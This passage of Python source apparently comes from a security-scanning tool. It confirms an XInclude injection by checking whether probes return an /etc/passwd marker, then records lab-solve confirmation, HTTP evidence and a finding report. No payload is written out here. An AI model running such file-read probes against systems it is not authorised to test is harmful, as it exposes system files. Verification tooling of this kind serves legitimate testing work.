                        return {"confirmed": True, "requestCount": spent}

                    return {
                        "confirmed": False,
                        "requestCount": spent,
                        "reason": "; ".join(reasons)[:250],
                    }

                swept = await sweep(candidates, _probe_candidate, budget=budget)
                candidate_outcomes = swept["candidateOutcomes"]
                # #1650 — `requestCount` describes the PROOF, i.e. the
                # transactions retained in httpEvidence, because the backend
                # rebuilder cross-checks the two against each other. The sweep's
                # other attempts (a candidate that did not fire, a delivery that
                # was tried first and missed) are exploration, not proof, and are
                # reported separately as `sweepRequests`. Conflating them made a
                # successful two-transaction proof arrive with requestCount=4 and
                # be rejected as "metrics are inconsistent" — on a run that had
                # just solved the lab.
                sweep_requests = swept["requestsUsed"]
                if not swept["fired"] or fired_candidate is None:
                    # Nothing to describe as proof, so report the real cost.
                    request_count += sweep_requests
                    # Keep the per-candidate diagnostics in the aggregate error —
                    # "nothing fired" without saying WHY is not actionable.
                    reasons = [
                        str(row.get("reason") or row.get("error") or row.get("skipped") or "")
                        for row in candidate_outcomes
                    ]
                    detail = "; ".join(reason for reason in reasons if reason)[:300]
                    reason = (
                        "no candidate returned the /etc/passwd proof marker "
                        f"({swept['candidatesSwept']} of {swept['candidatesTotal']} swept)"
                        + (f": {detail}" if detail else "")
                    )
                    # Candidate-level exceptions are real execution failures.
                    # Bounded negatives, truncation/oversize, and request-budget
                    # exhaustion are coverage outcomes: they must not fail the
                    # required tool and skip the rest of TARGETED_VULN_PROBES.
                    candidate_errors = [
                        str(row.get("error") or "")
                        for row in candidate_outcomes
                        if row.get("error")
                    ]
                    if candidate_errors:
                        return {
                            "success": False,
                            "fallback": False,
                            "error": reason[:500],
                            "requestCount": request_count,
                            "statusChecks": status_checks,
                            "cleanRequests": clean_requests,
                            "probeRequests": probe_requests,
                            "candidateOutcomes": candidate_outcomes,
                            "findings": [],
                        }
                    incomplete = sweep_incomplete or any(
                        row.get("skipped") for row in candidate_outcomes
                    )
                    return {
                        "success": True,
                        "fallback": False,
                        "verified": False,
                        "coverageStatus": (
                            "INCOMPLETE" if incomplete else "COMPLETE_NO_FINDING"
                        ),
                        "reason": reason[:500],
                        "target": target,
                        "requestCount": request_count,
                        "statusChecks": status_checks,
                        "cleanRequests": clean_requests,
                        "probeRequests": probe_requests,
                        "sweepRequests": sweep_requests,
                        "candidatesSwept": swept["candidatesSwept"],
                        "candidatesTotal": swept["candidatesTotal"],
                        "candidateOutcomes": candidate_outcomes,
                        "findings": [],
                    }
                clean_requests += 1
                probe_requests += 1
                evidence_steps.extend(fired_steps)
                request_count += len(fired_steps)
                endpoint_url = fired_candidate["url"]
                endpoint_path = _path_and_query(endpoint_url)
                injection_field = fired_candidate["injectionField"]
                baseline_value = fired_candidate["baselineValue"]
                additional_fields = fired_candidate["additionalFields"]
                mode = fired_candidate["mode"]

                if is_lab:
                    confirmation = await self._request(session, "GET", status_url)
                    request_count += 1
                    status_checks += 1
                    _status_matches(
                        "expectedBaselineStatus/solved-confirmation",
                        expected_baseline_status,
                        confirmation["status"],
                    )
                    if (
                        not self._response_is_bounded(confirmation)
                        or not response_contains_marker(confirmation["body"], solved_marker)
                        or response_contains_marker(confirmation["body"], unsolved_marker)
                    ):
                        raise ValueError(
                            "XInclude file-read marker was observed but the configured solved "
                            "transition was not"
                        )
                    evidence_steps.append(
                        build_http_evidence_step(
                            "solved-confirmation",
                            "GET",
                            status_url,
                            "",
                            confirmation,
                        )
                    )
        except Exception as exc:
            return {
                "success": False,
                "fallback": False,
                "error": str(exc)[:500],
                "requestCount": request_count,
                "statusChecks": status_checks,
                "cleanRequests": clean_requests,
                "probeRequests": probe_requests,
                "findings": [],
            }

        verification = {
            "verified": True,
            "fallback": False,
            # #1650 — the mode reported is the one that actually FIRED, which
            # may differ from the requested default when a candidate's observed
            # content type selected the other delivery.
            "mode": mode,
            "proofLevel": proof_level,
            "target": target,
            "engagement": str(parameters["engagement"]).lower(),
            "endpointPath": endpoint_path,
            "injectionField": injection_field,
            "baselineValue": baseline_value,
            "additionalFields": additional_fields,
            "expectedBaselineStatus": expected_baseline_status,
            "expectedProbeStatus": expected_probe_status,
            "requestCount": request_count,
            "statusChecks": status_checks,
            "cleanRequests": clean_requests,
            "probeRequests": probe_requests,
            # #1647 — these two are now OBSERVED results rather than hard-coded
            # literals that were only reachable because every raise was avoided.
            # A false value means the corroborating status assertion missed; the
            # finding is still emitted and carries the mismatch.
            "cleanBaselineStatusMatched": bool(baseline_status_matched and clean_status_matched),
            "cleanProofMarkerAbsent": True,
            "probeStatusMatched": bool(probe_status_matched),
            "probeProofMarkerPresent": True,
            "assertionMismatches": assertion_mismatches,
            # Exploration cost, kept distinct from the proof transaction count.
            "sweepRequests": sweep_requests,
            "candidatesSwept": swept["candidatesSwept"],
            # #1650 — name the real sink and show what else was tried, so the
            # finding is not "a scanner said so".
            "firingCandidate": {
                "url": endpoint_url,
                "mode": mode,
                "injectionField": injection_field,
                "source": fired_candidate.get("source"),
            },
            "candidateOutcomes": candidate_outcomes,
            "endpointUrl": endpoint_url,
            "httpEvidence": {"version": 1, "steps": evidence_steps},
        }
        # #1648 — lab-only proof material is added ONLY on the lab tier. The
        # backend rebuilder rejects a runtime-tier proof that carries any of it.
        if is_lab:
            verification.update(
                {
                    "statusPath": status_path,
                    "unsolvedMarker": unsolved_marker,
                    "solvedMarker": solved_marker,
                    "solvedBefore": False,
                    "solvedAfter": True,
                }
            )
        finding = build_nuclei_finding(target, verification)
        return {
            "success": True,
            "fallback": False,
            "coverageStatus": "CONFIRMED",
            "target": target,
            "requestCount": request_count,
            "verification": verification,
            "findings": [finding],
        }
